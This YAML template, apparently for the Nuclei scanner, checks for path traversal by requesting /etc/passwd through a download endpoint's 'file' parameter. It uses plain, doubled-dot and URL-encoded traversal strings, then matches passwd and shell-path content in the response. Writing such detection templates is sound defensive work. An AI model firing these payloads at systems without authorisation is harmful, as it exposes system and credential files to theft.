id: path-traversal-detect

info:
  name: Path Traversal Detection
  author: yourname
  severity: high
  description: >
    Detects path traversal vulnerability via the 'file' parameter.
    An attacker can read arbitrary files outside the web root,
    including /etc/passwd, application configs and private keys.
  tags: lfi,path-traversal,generic

http:
  - method: GET
    path:
      - "{{BaseURL}}/download?file=../../etc/passwd"
      - "{{BaseURL}}/download?file=....//....//etc/passwd"
      - "{{BaseURL}}/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body

      - type: word
        words:
          - "/bin/bash"
          - "/bin/sh"
        condition: or
        part: body
